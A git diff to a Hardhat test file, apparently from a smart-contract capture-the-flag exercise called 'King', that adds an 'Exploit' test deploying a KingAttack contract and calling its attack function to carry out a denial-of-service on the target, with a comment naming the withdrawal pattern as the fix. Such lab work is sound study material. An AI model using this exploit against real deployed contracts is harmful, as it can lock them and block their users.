@@ -18,7 +18,10 @@ describe("King", async function () {
     });
 
     it("Exploit", async function () {
-
+        // Basic DoS attack
+        // May be prevented by implementing the withdrawal desing pattern
+        const attacker = await (await ethers.getContractFactory("KingAttack")).deploy();
+        await attacker.attack(instance.address, { value: ethers.utils.parseEther("0.001") });
     });
 
     after(async function () {
